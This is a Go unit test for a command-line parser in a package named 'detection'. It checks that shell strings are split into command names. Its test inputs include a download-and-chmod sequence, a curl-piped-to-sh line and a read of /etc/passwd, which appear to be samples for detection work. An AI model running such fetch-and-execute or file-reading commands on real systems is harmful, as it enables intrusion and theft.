package detection

import (
	"reflect"
	"testing"
)

func TestParseCommandLine(t *testing.T) {
	tests := []struct {
		in   string
		want []string
	}{
		{"uname -a", []string{"uname"}},
		{"echo curl http://x", []string{"echo"}},
		{"cd /tmp; wget http://a/b && chmod +x b", []string{"cd", "wget", "chmod"}},
		{"sudo -u root FOO=1 /usr/bin/curl -s x.test/a | sh", []string{"curl", "sh"}},
		{`echo "a; wget http://x"`, []string{"echo"}},
		{"cat /etc/passwd > /tmp/out", []string{"cat"}},
	}
	for _, tt := range tests {
		var got []string
		for _, c := range ParseCommandLine(tt.in) {
			got = append(got, c.Name)
		}
		if !reflect.DeepEqual(got, tt.want) {
			t.Errorf("%q: got %v want %v", tt.in, got, tt.want)
		}
	}
	c := ParseCommandLine("cat /etc/passwd > /tmp/out")[0]
	if !reflect.DeepEqual(c.Args, []string{"/etc/passwd"}) {
		t.Errorf("redirect target should be dropped, args=%v", c.Args)
	}
}
